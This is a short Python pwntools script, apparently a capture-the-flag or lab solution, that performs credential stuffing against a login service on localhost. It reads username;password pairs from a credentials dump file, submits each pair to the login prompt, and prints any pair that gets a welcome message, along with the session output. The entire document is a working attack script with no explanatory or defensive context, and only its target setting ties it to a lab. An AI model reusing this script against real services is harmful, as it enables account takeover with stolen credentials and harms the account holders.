from pwn import *

host = "localhost"
port = 32858

#context.log_level = 'error'

def main():
    # get credentials dump
    with open("../creds-dump.txt", "r") as file:
        dumplist = [line.strip() for line in file.readlines()]
    # assert credentials dump isnt empty
    if len(dumplist) == 0:
        raise Exception("Creds dump is empty")

    # pwntools!
    for line in dumplist:
        # connect 
        conn = remote(host, port)
        conn.recvuntil(b"Username:")
        # send credentials
        username, password = line.split(";")
        conn.sendline(username.encode())     # send username
        conn.sendline(password.encode())     # password attempt

        # grab response & process
        response = conn.recvall(timeout=3).decode(errors="ignore").replace("\r", "")
        if f"Welcome {username}" in response:
            print("\nFound valid credentials: username=%s, password=%s" % (username, password))
            print("=====Output=====\n%s" % response)
            return
    
    # if we reached here, no credentials found
    print("No valid credentials found! :(")


if __name__ == '__main__':
    main()
